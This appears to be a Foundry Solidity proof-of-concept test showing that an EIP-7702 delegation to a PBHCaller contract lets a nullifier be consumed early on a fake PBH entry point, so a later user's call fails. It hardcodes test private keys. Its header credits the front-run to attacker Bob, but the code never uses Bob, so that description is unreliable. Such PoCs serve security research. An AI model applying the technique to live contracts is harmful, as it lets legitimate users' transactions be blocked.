// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PBHEntryPointImplementation} from "../src/PBHEntryPointImplementation.sol";
import {PBHCaller} from "../src/PBHCaller.sol";

/**
 * @title EIP7702FrontRunDelegationTest
 * @notice PoC demonstrating how an attacker can use EIP‑7702 delegation to front-run a legitimate user
 * by marking a nullifier as used.
 *
 * In this PoC, Alice's EOA (which initially has no on‑chain code) is upgraded using Foundry's
 * vm.signAndAttachDelegation cheatcode so that its code becomes that of PBHCaller. PBHCaller is now
 * a stateless (storage-less) contract whose callPBH() function takes the target address as an input.
 * Bob (the attacker) calls ALICE with data that calls callPBH(target, nullifier), where target is the fake
 * PBHEntryPoint. This marks the nullifier as used, so a later call from Alice with the same nullifier fails.
 */
contract EIP7702FrontRunDelegationTest is Test {
    // Alice's address and private key (EOA with no initial code).
    address ALICE = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    uint256 constant ALICE_PK = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    // Bob's address and private key (attacker).
    address BOB = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;
    uint256 constant BOB_PK = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;

    //Charlie's address and private key (legitimate user).
    address CHARLIE = 0x90F79bf6EB2c4f870365E785982E1f101E93b906;
    uint256 constant CHARLIE_PK = 0x7C025200912a7120a77d5c2d259d8921ae5329ea7164053e18be62f3e5b4c03e;

    PBHEntryPointImplementation public pbhImpl;
    PBHCaller public pbhCaller;

    // Test nullifier.
    uint256 constant TEST_NULLIFIER = 777;

    function setUp() public {
        // Deploy the fake PBH contract.
        pbhImpl = new PBHEntryPointImplementation();
        // Deploy PBHCaller (storage-less version).
        pbhCaller = new PBHCaller();
    }

    function test7702DelegationFrontrun() public {
        console2.log("Testing direct execution of PBHCaller via EIP-7702 delegation");
        
        // Alice signs a delegation allowing `pbhCaller` to execute transactions on her behalf
        vm.signAndAttachDelegation(address(pbhCaller), ALICE_PK);
        
        // Verify that ALICE now has code
        bytes memory code = ALICE.code;
        assertTrue(code.length > 0, "EIP7702 delegation not attached to ALICE");
        
        // Start pranking as Alice (the user with the delegation)
        // sets tx.origin to ALICE and msg.sender to ALICE
        vm.startPrank(ALICE, ALICE);

        // Use Alice to call the delegate contract at... Alice's address!
        PBHCaller(ALICE).callPBH(address(pbhImpl), TEST_NULLIFIER);
        vm.stopPrank();
        
        // Verify that the nullifier was marked as used
        bool used = pbhImpl.nullifierHashes(TEST_NULLIFIER);
        assertTrue(used, "Nullifier was not marked as used in direct execution");
        
        
        // Try to use the same nullifier again, it should fail
        vm.startPrank(CHARLIE);
        (bool successCharlie, ) = address(pbhImpl).call(
            abi.encodeWithSignature("pbhMulticall(uint256)", TEST_NULLIFIER)
        );
        assertFalse(successCharlie, "Second call succeeded despite nullifier already used");
        vm.stopPrank();
    }
}
